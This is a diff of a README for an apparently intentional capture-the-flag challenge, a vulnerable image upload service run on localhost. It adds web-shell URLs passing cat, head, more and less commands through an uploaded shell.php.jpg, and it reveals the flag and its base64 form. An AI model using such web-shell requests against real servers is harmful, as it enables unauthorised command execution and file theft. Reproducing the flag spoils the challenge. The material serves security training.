@@ -41,8 +41,8 @@ ImageUploader is a seemingly innocent image upload service that contains multipl
 
 1. **Clone the Repository**
 ```bash
-git clone https://github.com/yourusername/ImageUploader-CTF.git
-cd ImageUploader-CTF
+[git clone [https://github.com/YASHRVY7/CTF7.git]
+cd CTF7
 ```
 
 2. **Build and Run with Docker**
@@ -129,8 +129,13 @@ This step involves exploring the server's file system to locate and retrieve the
 3. **Reading the Flag File**
    - Multiple methods to read the flag content:
    ```
-   # Using cat
+   # Using cat (primary method)
    http://localhost:8080/uploads/shell.php.jpg?cmd=cat /var/hidden/level1/level2/secret_flag.txt
+   
+   # Alternative reading methods if cat is blocked
+   http://localhost:8080/uploads/shell.php.jpg?cmd=head -n 1 /var/hidden/level1/level2/secret_flag.txt
+   http://localhost:8080/uploads/shell.php.jpg?cmd=more /var/hidden/level1/level2/secret_flag.txt
+   http://localhost:8080/uploads/shell.php.jpg?cmd=less /var/hidden/level1/level2/secret_flag.txt
    ```
 
 ## Available Hints
@@ -148,8 +153,8 @@ This step involves exploring the server's file system to locate and retrieve the
 - Base64 encoded flag
 
 ## Flag Format
-- Encoded: `UmVhbEZsYWd7VGgxc18xc19OMHRfVGgzX0ZsNGdfWTB1X1czbnR9`
-- Decoded: `RealFlag{Th1s_1s_N0t_Th3_Fl4g_Y0u_W3nt}`
+- Encoded: `Q1RGe1RoMXNfMXNfWU91cl9GbDRnX0MwbmdyNHR6X1kwdV9GMHVuZF9JdH0=`
+- Decoded: `CTF{Th1s_1s_YOur_Fl4g_C0ngr4tz_Y0u_F0und_It}`
 
 ## Payload Explanation
 
